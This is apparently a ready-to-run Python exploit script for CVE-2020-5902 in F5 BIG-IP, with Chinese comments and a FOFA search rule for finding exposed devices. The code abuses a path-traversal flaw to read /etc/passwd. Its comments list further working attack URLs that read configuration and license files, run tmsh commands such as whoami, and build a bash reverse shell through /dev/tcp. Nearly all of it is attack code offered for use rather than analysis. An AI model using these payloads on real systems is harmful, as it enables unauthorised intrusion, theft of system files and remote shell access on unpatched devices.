#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 脚本信息
######################################################
NAME='CVE-2020-5902'
AUTHOR="Joker"
REMARK='F5 BIG-IP 远程代码执行漏洞1'
FOFA_RULE='title="BIG-IP&reg ;- Redirect"或icon_hash="-335242539"'
######################################################

def poc(target):
    result = {}
    vuln_url = target + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
    # 其他漏洞触发点
    #https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/tmp
    #https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release
    #https://{host}/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp
    #https://{host}/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=jaffa
    #https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
    #https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf
    #https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/
    #https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=whoami
    #https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
    # 反弹shell
    # https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
    # https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/1.txt&content=bash+-i+>%26/dev/tcp/127.0.0.1/4444+0>%261
    # https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/1.txt
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.9"
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)

        if "output" in r.text and r.status_code==200:
            c = json.loads(r.text)["output"]
            result['target'] = target
            result['poc'] = NAME
            result['data'] = c
            return result
        else:
            pass
    except Exception as e:
        pass


if __name__ == '__main__':
    poc("https://127.0.0.1/")